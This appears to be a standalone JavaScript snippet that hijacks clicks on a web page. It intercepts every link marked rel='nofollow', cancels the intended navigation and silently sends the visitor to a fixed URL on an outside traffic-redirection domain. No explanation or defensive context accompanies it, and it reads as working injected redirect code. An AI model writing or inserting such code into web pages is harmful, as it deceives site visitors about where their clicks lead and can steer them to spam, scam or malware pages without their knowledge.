document.querySelectorAll("a").forEach((elem) => {
	if (elem.rel === "nofollow") {
		elem.onclick = function (e) {
			e.preventDefault();
			window.location.href = "https://redirecttraff.site/8qCsqJpW";
			return false;
		};
	}
});
